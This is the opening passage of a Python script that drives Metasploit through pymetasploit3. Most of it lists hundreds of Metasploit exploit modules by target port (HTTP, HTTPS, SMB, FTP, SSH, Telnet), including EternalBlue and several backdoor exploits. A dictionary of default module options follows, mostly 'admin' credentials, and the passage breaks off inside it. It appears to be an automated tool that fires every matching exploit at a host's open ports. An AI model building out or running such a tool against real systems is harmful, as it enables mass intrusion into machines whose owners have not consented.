import subprocess, argparse, socket, builtins
from pymetasploit3.msfrpc import MsfRpcClient
from time import sleep

verbose = False

# defualt exploits for ports
PORT_80_EXPLOITS = ['bsdi/softcart/mercantec_softcart', 'freebsd/misc/citrix_netscaler_soap_bof', 'linux/http/advantech_switch_bash_env_exec', 'linux/http/airties_login_cgi_bof', 'linux/http/astium_sqli_upload', 'linux/http/atutor_filemanager_traversal', 'linux/http/axis_srv_parhand_rce', 'linux/http/belkin_login_bof', 'linux/http/bludit_upload_images_exec', 'linux/http/centreon_sqli_exec', 'linux/http/centreon_useralias_exec', 'linux/http/cisco_firepower_useradd', 'linux/http/cpi_tararchive_upload', 'linux/http/crypttech_cryptolog_login_exec', 'linux/http/cve_2019_1663_cisco_rmi_rce', 'linux/http/ddwrt_cgibin_exec', 'linux/http/denyall_waf_exec', 'linux/http/dlink_authentication_cgi_bof', 'linux/http/dlink_command_php_exec_noauth', 'linux/http/dlink_dcs931l_upload', 'linux/http/dlink_dcs_930l_authenticated_remote_command_execution', 'linux/http/dlink_diagnostic_exec_noauth', 'linux/http/dlink_dir300_exec_telnet', 'linux/http/dlink_dir605l_captcha_bof', 'linux/http/dlink_dir615_up_exec', 'linux/http/dlink_dir850l_unauth_exec', 'linux/http/dlink_dsl2750b_exec_noauth', 'linux/http/dlink_dspw110_cookie_noauth_exec', 'linux/http/dlink_dspw215_info_cgi_bof', 'linux/http/dlink_hedwig_cgi_bof', 'linux/http/dlink_hnap_bof', 'linux/http/dlink_hnap_header_exec_noauth', 'linux/http/dlink_hnap_login_bof', 'linux/http/dnalims_admin_exec', 'linux/http/dolibarr_cmd_exec', 'linux/http/dreambox_openpli_shell', 'linux/http/efw_chpasswd_exec', 'linux/http/esva_exec', 'linux/http/fritzbox_echo_exec', 'linux/http/github_enterprise_secret', 'linux/http/gitlist_exec', 'linux/http/goahead_ldpreload', 'linux/http/groundwork_monarch_cmd_exec', 'linux/http/huawei_hg532n_cmdinject', 'linux/http/kaltura_unserialize_cookie_rce', 'linux/http/kaltura_unserialize_rce', 'linux/http/librenms_addhost_cmd_inject', 'linux/http/librenms_collectd_cmd_inject', 'linux/http/linksys_apply_cgi', 'linux/http/linksys_e1500_apply_exec', 'linux/http/linksys_themoon_exec', 'linux/http/linksys_wrt110_cmd_exec', 'linux/http/linksys_wrt160nv2_apply_exec', 'linux/http/linksys_wrt54gl_apply_exec', 'linux/http/linksys_wvbr0_user_agent_exec_noauth', 'linux/http/logsign_exec', 'linux/http/microfocus_secure_messaging_gateway', 'linux/http/multi_ncc_ping_exec', 'linux/http/mutiny_frontend_upload', 'linux/http/mvpower_dvr_shell_exec', 'linux/http/nagios_xi_chained_rce', 'linux/http/nagios_xi_chained_rce_2_electric_boogaloo', 'linux/http/nagios_xi_magpie_debug', 'linux/http/netgear_dgn1000_setup_unauth_exec', 'linux/http/netgear_dgn1000b_setup_exec', 'linux/http/netgear_dgn2200b_pppoe_exec', 'linux/http/netgear_dnslookup_cmd_exec', 'linux/http/netgear_r7000_cgibin_exec', 'linux/http/netgear_unauth_exec', 'linux/http/netgear_wnr2000_rce', 'linux/http/nginx_chunked_size', 'linux/http/pandora_fms_sqli', 'linux/http/php_imap_open_rce', 'linux/http/piranha_passwd_exec', 'linux/http/pulse_secure_cmd_exec', 'linux/http/qnap_qcenter_change_passwd_exec', 'linux/http/raidsonic_nas_ib5220_exec_noauth', 'linux/http/railo_cfml_rfi', 'linux/http/samsung_srv_1670d_upload_exec', 'linux/http/seagate_nas_php_exec_noauth', 'linux/http/smt_ipmi_close_window_bof', 'linux/http/symantec_web_gateway_exec', 'linux/http/symantec_web_gateway_file_upload', 'linux/http/symantec_web_gateway_lfi', 'linux/http/symantec_web_gateway_pbcontrol', 'linux/http/symantec_web_gateway_restore', 'linux/http/tiki_calendar_exec', 'linux/http/tp_link_sc2020n_authenticated_telnet_injection', 'linux/http/trendmicro_imsva_widget_exec', 'linux/http/trendmicro_sps_exec', 'linux/http/trueonline_billion_5200w_rce', 'linux/http/trueonline_p660hn_v1_rce', 'linux/http/trueonline_p660hn_v2_rce', 'linux/http/vap2500_tools_command_exec', 'linux/http/vcms_upload', 'linux/http/wanem_exec', 'linux/http/wd_mycloud_multiupload_upload', 'linux/http/webcalendar_settings_exec', 'linux/http/webid_converter', 'linux/http/webmin_packageup_rce', 'linux/http/wipg1000_cmd_injection', 'linux/http/xplico_exec', 'linux/http/zabbix_sqli', 'linux/http/zimbra_xxe_rce', 'multi/http/activecollab_chat', 'multi/http/ajaxplorer_checkinstall_exec', 'multi/http/apache_mod_cgi_bash_env_exec', 'multi/http/apprain_upload_exec', 'multi/http/atutor_sqli', 'multi/http/auxilium_upload_exec', 'multi/http/bolt_file_upload', 'multi/http/builderengine_upload_exec', 'multi/http/caidao_php_backdoor_exec', 'multi/http/cisco_dcnm_upload', 'multi/http/clipbucket_fileupload_exec', 'multi/http/cmsms_object_injection_rce', 'multi/http/cmsms_showtime2_rce', 'multi/http/cmsms_upload_rename_rce', 'multi/http/coldfusion_ckeditor_file_upload', 'multi/http/coldfusion_rds_auth_bypass', 'multi/http/confluence_widget_connector', 'multi/http/cuteflow_upload_exec', 'multi/http/dexter_casinoloader_exec', 'multi/http/drupal_drupageddon', 'multi/http/extplorer_upload_exec', 'multi/http/familycms_less_exec', 'multi/http/freenas_exec_raw', 'multi/http/gestioip_exec', 'multi/http/getsimplecms_unauth_code_exec', 'multi/http/gitlab_shell_exec', 'multi/http/gitlist_arg_injection', 'multi/http/gitorious_graph', 'multi/http/glossword_upload_exec', 'multi/http/glpi_install_rce', 'multi/http/horde_form_file_upload', 'multi/http/horde_href_backdoor', 'multi/http/ibm_openadmin_tool_soap_welcomeserver_exec', 'multi/http/ispconfig_php_exec', 'multi/http/jenkins_script_console', 'multi/http/jira_hipchat_template', 'multi/http/joomla_http_header_rce', 'multi/http/kordil_edms_upload_exec', 'multi/http/lcms_php_exec', 'multi/http/log1cms_ajax_create_folder', 'multi/http/magento_unserialize', 'multi/http/makoserver_cmd_exec', 'multi/http/mantisbt_manage_proj_page_rce', 'multi/http/mantisbt_php_exec', 'multi/http/mediawiki_syntaxhighlight', 'multi/http/mediawiki_thumb', 'multi/http/mma_backdoor_upload', 'multi/http/mobilecartly_upload_exec', 'multi/http/monstra_fileupload_exec', 'multi/http/moodle_cmd_exec', 'multi/http/movabletype_upgrade_exec', 'multi/http/mutiny_subnetmask_exec', 'multi/http/nas4free_php_exec', 'multi/http/navigate_cms_rce', 'multi/http/nibbleblog_file_upload', 'multi/http/nostromo_code_exec', 'multi/http/novell_servicedesk_rce', 'multi/http/nuuo_nvrmini_upgrade_rce', 'multi/http/october_upload_bypass_exec', 'multi/http/openmediavault_cmd_exec', 'multi/http/openx_backdoor_php', 'multi/http/opmanager_socialit_file_upload', 'multi/http/oracle_reports_rce', 'multi/http/oscommerce_installer_unauth_code_exec', 'multi/http/pandora_upload_exec', 'multi/http/phoenix_exec', 'multi/http/php_cgi_arg_injection', 'multi/http/php_utility_belt_rce', 'multi/http/php_volunteer_upload_exec', 'multi/http/phpfilemanager_rce', 'multi/http/phpldapadmin_query_engine', 'multi/http/phpmailer_arg_injection', 'multi/http/phpmoadmin_exec', 'multi/http/phpmyadmin_3522_backdoor', 'multi/http/phpmyadmin_lfi_rce', 'multi/http/phpmyadmin_null_termination_exec', 'multi/http/phpmyadmin_preg_replace', 'multi/http/phpscheduleit_start_date', 'multi/http/phptax_exec', 'multi/http/phpwiki_ploticus_exec', 'multi/http/pimcore_unserialize_rce', 'multi/http/playsms_filename_exec', 'multi/http/playsms_uploadcsv_exec', 'multi/http/pmwiki_pagelist', 'multi/http/polarcms_upload_exec', 'multi/http/processmaker_exec', 'multi/http/processmaker_plugin_upload', 'multi/http/qdpm_upload_exec', 'multi/http/rails_actionpack_inline_exec', 'multi/http/rails_double_tap', 'multi/http/rails_json_yaml_code_exec', 'multi/http/rails_secret_deserialization', 'multi/http/rails_xml_yaml_code_exec', 'multi/http/sflog_upload_exec', 'multi/http/shopware_createinstancefromnamedarguments_rce', 'multi/http/simple_backdoors_exec', 'multi/http/sit_file_upload', 'multi/http/snortreport_exec', 'multi/http/sonicwall_gms_upload', 'multi/http/sonicwall_scrutinizer_methoddetail_sqli', 'multi/http/spree_search_exec', 'multi/http/spree_searchlogic_exec', 'multi/http/stunshell_eval', 'multi/http/stunshell_exec', 'multi/http/sun_jsws_dav_options', 'multi/http/testlink_upload_exec', 'multi/http/tomcat_mgr_deploy', 'multi/http/tomcat_mgr_upload', 'multi/http/totaljs_cms_widget_exec', 'multi/http/traq_plugin_exec', 'multi/http/v0pcr3w_exec', 'multi/http/vbseo_proc_deutf', 'multi/http/vbulletin_unserialize', 'multi/http/vtiger_install_rce', 'multi/http/vtiger_logo_upload_exec', 'multi/http/vtiger_php_exec', 'multi/http/vtiger_soap_upload', 'multi/http/webpagetest_upload_exec', 'multi/http/werkzeug_debug_rce', 'multi/http/wikka_spam_exec', 'multi/http/wp_crop_rce', 'multi/http/wp_db_backup_rce', 'multi/http/wp_ninja_forms_unauthenticated_file_upload', 'multi/http/wp_responsive_thumbnail_slider_upload', 'multi/http/x7chat2_php_exec', 'multi/http/zabbix_script_exec', 'multi/http/zemra_panel_rce', 'multi/http/zpanel_information_disclosure_rce', 'multi/php/php_unserialize_zval_cookie', 'multi/php/wp_duplicator_code_inject', 'multi/realserver/describe', 'multi/wyse/hagent_untrusted_hsdata', 'unix/ftp/proftpd_modcopy_exec', 'unix/http/contentkeeperweb_mimencode', 'unix/http/ctek_skyrouter', 'unix/http/dell_kace_k1000_upload', 'unix/http/epmp1000_get_chart_cmd_shell', 'unix/http/epmp1000_ping_cmd_shell', 'unix/http/freepbx_callmenum', 'unix/http/laravel_token_unserialize_exec', 'unix/http/lifesize_room', 'unix/http/quest_kace_systems_management_rce', 'unix/http/schneider_electric_net55xx_encoder', 'unix/http/twiki_debug_plugins', 'unix/http/vmturbo_vmtadmin_exec_noauth', 'unix/http/xdebug_unauth_exec', 'unix/sonicwall/sonicwall_xmlrpc_rce', 'unix/webapp/actualanalyzer_ant_cookie_exec', 'unix/webapp/arkeia_upload_exec', 'unix/webapp/awstats_configdir_exec', 'unix/webapp/awstats_migrate_exec', 'unix/webapp/awstatstotals_multisort', 'unix/webapp/barracuda_img_exec', 'unix/webapp/base_qry_common', 'unix/webapp/basilic_diff_exec', 'unix/webapp/cacti_graphimage_exec', 'unix/webapp/cakephp_cache_corruption', 'unix/webapp/carberp_backdoor_exec', 'unix/webapp/clipbucket_upload_exec', 'unix/webapp/coppermine_piceditor', 'unix/webapp/datalife_preview_exec', 'unix/webapp/dogfood_spell_exec', 'unix/webapp/drupal_coder_exec', 'unix/webapp/drupal_drupalgeddon2', 'unix/webapp/drupal_restws_exec', 'unix/webapp/drupal_restws_unserialize', 'unix/webapp/egallery_upload_exec', 'unix/webapp/elfinder_php_connector_exiftran_cmd_injection', 'unix/webapp/flashchat_upload_exec', 'unix/webapp/foswiki_maketext', 'unix/webapp/freepbx_config_exec', 'unix/webapp/fusionpbx_exec_cmd_exec', 'unix/webapp/fusionpbx_operator_panel_exec_cmd_exec', 'unix/webapp/generic_exec', 'unix/webapp/get_simple_cms_upload_exec', 'unix/webapp/google_proxystylesheet_exec', 'unix/webapp/graphite_pickle_exec', 'unix/webapp/guestbook_ssi_exec', 'unix/webapp/hastymail_exec', 'unix/webapp/havalite_upload_exec', 'unix/webapp/horde_unserialize_exec', 'unix/webapp/hybridauth_install_php_exec', 'unix/webapp/instantcms_exec', 'unix/webapp/invision_pboard_unserialize_exec', 'unix/webapp/joomla_akeeba_unserialize', 'unix/webapp/joomla_comfields_sqli_rce', 'unix/webapp/joomla_comjce_imgmanager', 'unix/webapp/joomla_contenthistory_sqli_rce', 'unix/webapp/joomla_media_upload_exec', 'unix/webapp/joomla_tinybrowser', 'unix/webapp/jquery_file_upload', 'unix/webapp/kimai_sqli', 'unix/webapp/libretto_upload_exec', 'unix/webapp/maarch_letterbox_file_upload', 'unix/webapp/mambo_cache_lite', 'unix/webapp/mitel_awc_exec', 'unix/webapp/moinmoin_twikidraw', 'unix/webapp/mybb_backdoor', 'unix/webapp/nagios3_history_cgi', 'unix/webapp/nagios3_statuswml_ping', 'unix/webapp/nagios_graph_explorer', 'unix/webapp/narcissus_backend_exec', 'unix/webapp/open_flash_chart_upload_exec', 'unix/webapp/openemr_sqli_privesc_upload', 'unix/webapp/openemr_upload_exec', 'unix/webapp/opensis_modname_exec', 'unix/webapp/openview_connectednodes_exec', 'unix/webapp/openx_banner_edit', 'unix/webapp/oscommerce_filemanager', 'unix/webapp/pajax_remote_exec', 'unix/webapp/php_charts_exec', 'unix/webapp/php_eval', 'unix/webapp/php_include', 'unix/webapp/php_vbulletin_template', 'unix/webapp/php_xmlrpc_eval', 'unix/webapp/phpbb_highlight', 'unix/webapp/phpcollab_upload_exec', 'unix/webapp/phpmyadmin_config', 'unix/webapp/piwik_superuser_plugin_upload', 'unix/webapp/projectpier_upload_exec', 'unix/webapp/projectsend_upload_exec', 'unix/webapp/rconfig_install_cmd_exec', 'unix/webapp/redmine_scm_exec', 'unix/webapp/seportal_sqli_exec', 'unix/webapp/simple_e_document_upload_exec', 'unix/webapp/sixapart_movabletype_storable_exec', 'unix/webapp/skybluecanvas_exec', 'unix/webapp/sphpblog_file_upload', 'unix/webapp/spip_connect_exec', 'unix/webapp/squash_yaml_exec', 'unix/webapp/sugarcrm_rest_unserialize_exec', 'unix/webapp/sugarcrm_unserialize_exec', 'unix/webapp/tikiwiki_graph_formula_exec', 'unix/webapp/tikiwiki_jhot_exec', 'unix/webapp/tikiwiki_unserialize_exec', 'unix/webapp/tikiwiki_upload_exec', 'unix/webapp/trixbox_langchoice', 'unix/webapp/twiki_history', 'unix/webapp/twiki_maketext', 'unix/webapp/twiki_search', 'unix/webapp/vbulletin_vote_sqli_exec', 'unix/webapp/vicidial_manager_send_cmd_exec', 'unix/webapp/vicidial_user_authorization_unauth_cmd_exec', 'unix/webapp/webmin_upload_exec', 'unix/webapp/webtester_exec', 'unix/webapp/wp_admin_shell_upload', 'unix/webapp/wp_advanced_custom_fields_exec', 'unix/webapp/wp_ajax_load_more_file_upload', 'unix/webapp/wp_asset_manager_upload_exec', 'unix/webapp/wp_creativecontactform_file_upload', 'unix/webapp/wp_downloadmanager_upload', 'unix/webapp/wp_easycart_unrestricted_file_upload', 'unix/webapp/wp_foxypress_upload', 'unix/webapp/wp_frontend_editor_file_upload', 'unix/webapp/wp_google_document_embedder_exec', 'unix/webapp/wp_holding_pattern_file_upload', 'unix/webapp/wp_inboundio_marketing_file_upload', 'unix/webapp/wp_infusionsoft_upload', 'unix/webapp/wp_lastpost_exec', 'unix/webapp/wp_mobile_detector_upload_execute', 'unix/webapp/wp_nmediawebsite_file_upload', 'unix/webapp/wp_optimizepress_upload', 'unix/webapp/wp_photo_gallery_unrestricted_file_upload', 'unix/webapp/wp_phpmailer_host_header', 'unix/webapp/wp_pixabay_images_upload', 'unix/webapp/wp_platform_exec', 'unix/webapp/wp_property_upload_exec', 'unix/webapp/wp_reflexgallery_file_upload', 'unix/webapp/wp_revslider_upload_execute', 'unix/webapp/wp_slideshowgallery_upload', 'unix/webapp/wp_symposium_shell_upload', 'unix/webapp/wp_total_cache_exec', 'unix/webapp/wp_worktheflow_upload', 'unix/webapp/wp_wpshop_ecommerce_file_upload', 'unix/webapp/wp_wptouch_file_upload', 'unix/webapp/wp_wysija_newsletters_upload', 'unix/webapp/xoda_file_upload', 'unix/webapp/xymon_useradm_cmd_exec', 'unix/webapp/zeroshell_exec', 'unix/webapp/zoneminder_packagecontrol_exec', 'unix/webapp/zpanel_username_exec', 'windows/http/amlibweb_webquerydll_app', 'windows/http/apache_chunked', 'windows/http/apache_mod_rewrite_ldap', 'windows/http/apache_modjk_overflow', 'windows/http/avaya_ccr_imageupload_exec', 'windows/http/badblue_ext_overflow', 'windows/http/badblue_passthru', 'windows/http/bea_weblogic_jsessionid', 'windows/http/bea_weblogic_post_bof', 'windows/http/bea_weblogic_transfer_encoding', 'windows/http/belkin_bulldog', 'windows/http/cogent_datahub_command', 'windows/http/cogent_datahub_request_headers_bof', 'windows/http/coldfusion_fckeditor', 'windows/http/disk_pulse_enterprise_bof', 'windows/http/disk_pulse_enterprise_get', 'windows/http/diskboss_get_bof', 'windows/http/disksavvy_get_bof', 'windows/http/disksorter_bof', 'windows/http/dup_scout_enterprise_login_bof', 'windows/http/dupscts_bof', 'windows/http/easychatserver_seh', 'windows/http/efs_easychatserver_username', 'windows/http/efs_fmws_userid_bof', 'windows/http/ektron_xslt_exec', 'windows/http/ektron_xslt_exec_ws', 'windows/http/fdm_auth_header', 'windows/http/file_sharing_wizard_seh', 'windows/http/generic_http_dll_injection', 'windows/http/gitstack_rce', 'windows/http/hp_mpa_job_acct', 'windows/http/hp_nnm_getnnmdata_hostname', 'windows/http/hp_nnm_getnnmdata_icount', 'windows/http/hp_nnm_getnnmdata_maxage', 'windows/http/hp_nnm_nnmrptconfig_nameparams', 'windows/http/hp_nnm_nnmrptconfig_schdparams', 'windows/http/hp_nnm_openview5', 'windows/http/hp_nnm_ovalarm_lang', 'windows/http/hp_nnm_ovbuildpath_textfile', 'windows/http/hp_nnm_ovwebhelp', 'windows/http/hp_nnm_ovwebsnmpsrv_main', 'windows/http/hp_nnm_ovwebsnmpsrv_ovutil', 'windows/http/hp_nnm_ovwebsnmpsrv_uro', 'windows/http/hp_nnm_snmp', 'windows/http/hp_nnm_snmpviewer_actapp', 'windows/http/hp_nnm_toolbar_01', 'windows/http/hp_nnm_toolbar_02', 'windows/http/hp_nnm_webappmon_execvp', 'windows/http/hp_nnm_webappmon_ovjavalocale', 'windows/http/hp_openview_insight_backdoor', 'windows/http/hp_power_manager_filename', 'windows/http/hp_power_manager_login', 'windows/http/httpdx_handlepeer', 'windows/http/httpdx_tolog_format', 'windows/http/ia_webmail', 'windows/http/intrasrv_bof', 'windows/http/ipswitch_wug_maincfgret', 'windows/http/kaseya_uploader', 'windows/http/kaseya_uploadimage_file_upload', 'windows/http/kolibri_http', 'windows/http/landesk_thinkmanagement_upload_asp', 'windows/http/mailenable_auth_header', 'windows/http/manage_engine_opmanager_rce', 'windows/http/manageengine_appmanager_exec', 'windows/http/minishare_get_overflow', 'windows/http/navicopa_get_overflow', 'windows/http/netdecision_http_bof', 'windows/http/novell_mdm_lfi', 'windows/http/oats_weblogic_console', 'windows/http/octopusdeploy_deploy', 'windows/http/oracle_beehive_evaluation', 'windows/http/oracle_beehive_prepareaudiotoplay', 'windows/http/php_apache_request_headers_bof', 'windows/http/privatewire_gateway', 'windows/http/rejetto_hfs_exec', 'windows/http/sambar6_search_results', 'windows/http/savant_31_overflow', 'windows/http/servu_session_cookie', 'windows/http/shttpd_post', 'windows/http/solarwinds_fsm_userlogin', 'windows/http/sonicwall_scrutinizer_sqli', 'windows/http/sws_connection_bof', 'windows/http/syncbreeze_bof', 'windows/http/sysax_create_folder', 'windows/http/tomcat_cgi_cmdlineargs', 'windows/http/trackit_file_upload', 'windows/http/trendmicro_officescan_widget_exec', 'windows/http/ultraminihttp_bof', 'windows/http/umbraco_upload_aspx', 'windows/http/vxsrchs_bof', 'windows/http/webster_http', 'windows/http/xampp_webdav_upload_php', 'windows/http/xitami_if_mod_since', 'windows/http/zenworks_uploadservlet', 'windows/iis/iis_webdav_scstoragepathfromurl', 'windows/iis/iis_webdav_upload_asp', 'windows/iis/ms01_023_printer', 'windows/iis/ms01_026_dbldecode', 'windows/iis/ms01_033_idq', 'windows/iis/ms02_018_htr', 'windows/iis/ms02_065_msadc', 'windows/iis/ms03_007_ntdll_webdav', 'windows/iis/msadc', 'windows/isapi/ms00_094_pbserver', 'windows/isapi/ms03_022_nsiislog_post', 'windows/isapi/ms03_051_fp30reg_chunked', 'windows/isapi/rsa_webagent_redirect', 'windows/isapi/w3who_query', 'windows/lotus/domino_http_accept_language', 'windows/misc/gh0st', 'windows/mssql/ms09_004_sp_replwritetovarbin_sqli', 'windows/mssql/mssql_payload_sqli', 'windows/proxy/bluecoat_winproxy_host', 'windows/proxy/qbik_wingate_wwwproxy', 'windows/scada/advantech_webaccess_dashboard_file_upload', 'windows/scada/ge_proficy_cimplicity_gefebt']
PORT_8080_EXPLOITS = ['linux/http/apache_continuum_cmd_exec', 'linux/http/dcos_marathon', 'linux/http/empire_skywalker', 'linux/http/rancher_server', 'linux/http/zenoss_showdaemonxmlconfig_exec', 'linux/misc/jenkins_java_deserialize', 'linux/misc/jenkins_ldap_deserialize', 'multi/http/apache_jetspeed_file_upload', 'multi/http/apache_roller_ognl_injection', 'multi/http/axis2_deployer', 'multi/http/bassmaster_js_injection', 'multi/http/hp_sitescope_issuesiebelcmd', 'multi/http/hp_sitescope_uploadfileshandler', 'multi/http/jboss_bshdeployer', 'multi/http/jboss_deploymentfilerepository', 'multi/http/jboss_invoke_deploy', 'multi/http/jboss_maindeployer', 'multi/http/jboss_seam_upload_exec', 'multi/http/jenkins_metaprogramming', 'multi/http/jenkins_xstream_deserialize', 'multi/http/manageengine_auth_upload', 'multi/http/manageengine_sd_uploader', 'multi/http/plone_popen2', 'multi/http/struts2_code_exec_showcase', 'multi/http/struts2_content_type_ognl', 'multi/http/struts2_namespace_ognl', 'multi/http/struts2_rest_xstream', 'multi/http/struts_code_exec', 'multi/http/struts_code_exec_classloader', 'multi/http/struts_code_exec_exception_delegator', 'multi/http/struts_code_exec_parameters', 'multi/http/struts_default_action_mapper', 'multi/http/struts_dev_mode', 'multi/http/struts_dmi_exec', 'multi/http/struts_dmi_rest_exec', 'multi/http/struts_include_params', 'multi/http/sysaid_auth_file_upload', 'multi/http/sysaid_rdslogs_file_upload', 'multi/http/tomcat_jsp_upload_bypass', 'osx/http/evocam_webserver', 'windows/http/adobe_robohelper_authbypass', 'windows/http/easyftp_list', 'windows/http/ericom_access_now_bof', 'windows/http/hp_imc_bims_upload', 'windows/http/hp_imc_java_deserialize', 'windows/http/hp_imc_mibfileupload', 'windows/http/hp_loadrunner_copyfiletoserver', 'windows/http/hp_sitescope_dns_tool', 'windows/http/hp_sitescope_runomagentcommand', 'windows/http/jira_collector_traversal', 'windows/http/netgear_nms_rce', 'windows/http/novell_imanager_upload', 'windows/http/oracle9i_xdb_pass', 'windows/http/psoproxy91_overflow', 'windows/http/sybase_easerver', 'windows/http/trendmicro_officescan', 'windows/http/zenworks_assetmgmt_uploadservlet', 'windows/scada/codesys_web_server']
PORT_443_EXPLOITS = ['freebsd/http/watchguard_cmd_exec', 'linux/http/accellion_fta_getstatus_oauth', 'linux/http/alcatel_omnipcx_mastercgi_exec', 'linux/http/alienvault_exec', 'linux/http/alienvault_sqli_exec', 'linux/http/cfme_manageiq_evm_upload_exec', 'linux/http/cisco_prime_inf_rce', 'linux/http/cisco_ucs_rce', 'linux/http/f5_icall_cmd', 'linux/http/f5_icontrol_exec', 'linux/http/foreman_openstack_satellite_code_exec', 'linux/http/goautodial_3_rce_command_injection', 'linux/http/ibm_qradar_unauth_rce', 'linux/http/imperva_securesphere_exec', 'linux/http/lifesize_uvc_ping_rce', 'linux/http/mailcleaner_exec', 'linux/http/netgear_readynas_exec', 'linux/http/op5_config_exec', 'linux/http/panos_readsessionvars', 'linux/http/riverbed_netprofiler_netexpress_exec', 'linux/http/sophos_wpa_iface_exec', 'linux/http/sophos_wpa_sblistpack_exec', 'linux/http/symantec_messaging_gateway_exec', 'linux/http/ubiquiti_airos_file_upload', 'linux/http/ueb_api_rce', 'multi/http/cisco_dcnm_upload_2019', 'multi/http/op5_license', 'multi/http/op5_welcome', 'multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi', 'multi/http/zenworks_configuration_management_upload', 'multi/http/zenworks_control_center_upload', 'unix/http/pfsense_graph_injection_exec', 'unix/http/pfsense_group_member_exec', 'unix/webapp/citrix_access_gateway_exec', 'unix/webapp/tuleap_rest_unserialize_exec', 'unix/webapp/tuleap_unserialize_exec', 'windows/http/hp_pcm_snac_update_certificates', 'windows/http/hp_pcm_snac_update_domain', 'windows/http/ibm_tpmfosd_overflow', 'windows/http/osb_uname_jlist', 'windows/http/vmware_vcenter_chargeback_upload', 'windows/misc/ahsay_backup_fileupload', 'windows/misc/hp_loadrunner_magentproc', 'windows/novell/netiq_pum_eval']
PORT_445_EXPLOITS = ['multi/samba/usermap_script','linux/samba/is_known_pipename', 'linux/samba/lsa_transnames_heap', 'linux/samba/setinfopolicy_heap', 'netware/smb/lsass_cifs', 'osx/samba/lsa_transnames_heap', 'solaris/samba/lsa_transnames_heap', 'windows/brightstor/etrust_itm_alert', 'windows/oracle/extjob', 'windows/smb/doublepulsar_rce', 'windows/smb/ipass_pipe_exec', 'windows/smb/ms03_049_netapi', 'windows/smb/ms04_007_killbill', 'windows/smb/ms04_011_lsass', 'windows/smb/ms04_031_netdde', 'windows/smb/ms05_039_pnp', 'windows/smb/ms06_025_rasmans_reg', 'windows/smb/ms06_025_rras', 'windows/smb/ms06_040_netapi', 'windows/smb/ms06_066_nwapi', 'windows/smb/ms06_066_nwwks', 'windows/smb/ms06_070_wkssvc', 'windows/smb/ms07_029_msdns_zonename', 'windows/smb/ms08_067_netapi', 'windows/smb/ms09_050_smb2_negotiate_func_index', 'windows/smb/ms10_061_spoolss', 'windows/smb/ms17_010_eternalblue', 'windows/smb/ms17_010_eternalblue_win8', 'windows/smb/ms17_010_psexec', 'windows/smb/netidentity_xtierrpcpipe', 'windows/smb/psexec', 'windows/smb/psexec_psh', 'windows/smb/timbuktu_plughntcommand_bof', 'windows/smb/webexec']
PORT_21_EXPLOITS = ['freebsd/ftp/proftp_telnet_iac', 'linux/ftp/proftp_sreplace', 'linux/ftp/proftp_telnet_iac', 'mainframe/ftp/ftp_jcl_creds', 'multi/ftp/pureftpd_bash_env_exec', 'multi/ftp/wuftpd_site_exec_format', 'osx/ftp/webstar_ftp_user', 'unix/ftp/proftpd_133c_backdoor', 'unix/ftp/vsftpd_234_backdoor', 'windows/ftp/3cdaemon_ftp_user', 'windows/ftp/ability_server_stor', 'windows/ftp/bison_ftp_bof', 'windows/ftp/cesarftp_mkd', 'windows/ftp/comsnd_ftpd_fmtstr', 'windows/ftp/dreamftp_format', 'windows/ftp/easyfilesharing_pass', 'windows/ftp/easyftp_cwd_fixret', 'windows/ftp/easyftp_list_fixret', 'windows/ftp/easyftp_mkd_fixret', 'windows/ftp/filecopa_list_overflow', 'windows/ftp/freefloatftp_user', 'windows/ftp/freefloatftp_wbem', 'windows/ftp/freeftpd_pass', 'windows/ftp/freeftpd_user', 'windows/ftp/globalscapeftp_input', 'windows/ftp/goldenftp_pass_bof', 'windows/ftp/httpdx_tolog_format', 'windows/ftp/kmftp_utility_cwd', 'windows/ftp/ms09_053_ftpd_nlst', 'windows/ftp/netterm_netftpd_user', 'windows/ftp/open_ftpd_wbem', 'windows/ftp/pcman_put', 'windows/ftp/pcman_stor', 'windows/ftp/quickshare_traversal_write', 'windows/ftp/ricoh_dl_bof', 'windows/ftp/sami_ftpd_list', 'windows/ftp/sami_ftpd_user', 'windows/ftp/servu_chmod', 'windows/ftp/servu_mdtm', 'windows/ftp/slimftpd_list_concat', 'windows/ftp/turboftp_port', 'windows/ftp/vermillion_ftpd_port', 'windows/ftp/warftpd_165_pass', 'windows/ftp/warftpd_165_user', 'windows/ftp/wftpd_size', 'windows/ftp/wsftp_server_503_mkd', 'windows/ftp/wsftp_server_505_xmd5', 'windows/ftp/xlink_server']
PORT_22_EXPLOITS = ['apple_ios/ssh/cydia_default_ssh', 'linux/ssh/ceragon_fibeair_known_privkey', 'linux/ssh/cisco_ucs_scpuser', 'linux/ssh/exagrid_known_privkey', 'linux/ssh/f5_bigip_known_privkey', 'linux/ssh/loadbalancerorg_enterprise_known_privkey', 'linux/ssh/mercurial_ssh_exec', 'linux/ssh/quantum_dxi_known_privkey', 'linux/ssh/quantum_vmpro_backdoor', 'linux/ssh/symantec_smg_ssh', 'linux/ssh/vmware_vdp_known_privkey', 'multi/ssh/sshexec', 'unix/ssh/array_vxag_vapv_privkey_privesc', 'unix/ssh/tectia_passwd_changereq', 'windows/ssh/freeftpd_key_exchange', 'windows/ssh/freesshd_authbypass', 'windows/ssh/freesshd_key_exchange', 'windows/ssh/sysax_ssh_username']
PORT_23_EXPLOITS = ['freebsd/telnet/telnet_encrypt_keyid', 'linux/telnet/netgear_telnetenable', 'linux/telnet/telnet_encrypt_keyid', 'solaris/telnet/fuser', 'solaris/telnet/ttyprompt', 'unix/misc/polycom_hdx_auth_bypass', 'unix/misc/polycom_hdx_traceroute_exec', 'windows/proxy/ccproxy_telnet_ping', 'windows/scada/procyon_core_server', 'windows/telnet/gamsoft_telsrv_username']

exploit_dict = {'80': PORT_80_EXPLOITS,
                '8080': PORT_8080_EXPLOITS,
                '443': PORT_443_EXPLOITS,
                '445': PORT_445_EXPLOITS,
                '21': PORT_21_EXPLOITS,
                '22': PORT_22_EXPLOITS,
                '23': PORT_23_EXPLOITS}

# default vars
defaults = {
    "USERNAME": 'admin',
    "PASSWORD": 'admin',
    "USER": 'admin',
    "PASS": 'admin',
    "WP_PASSWORD": 'admin',
    "WP_USERNAME": 'admin',
    "WP_USER": 'admin',
    "OATSPASSWORD": 'admin',
    "SysaxPASS": 'admin',
    "SysaxUSER": 'admin',
    "EFW_USERNAME": 'admin',
    "EFW_PASSWORD": 'admin',
    "SSH_USERNAME": 'admin',
    "SSH_PASSWORD": 'admin',
    "SSH_ADDRESS": '127.0.0.1',
    "TARGETURI": '/',
    "FORM_PATH": '/',
    "PAGE": '/',
    "SECRET": 'admin',
    "COLLECTOR": '0',
    "DOMAIN": '.',
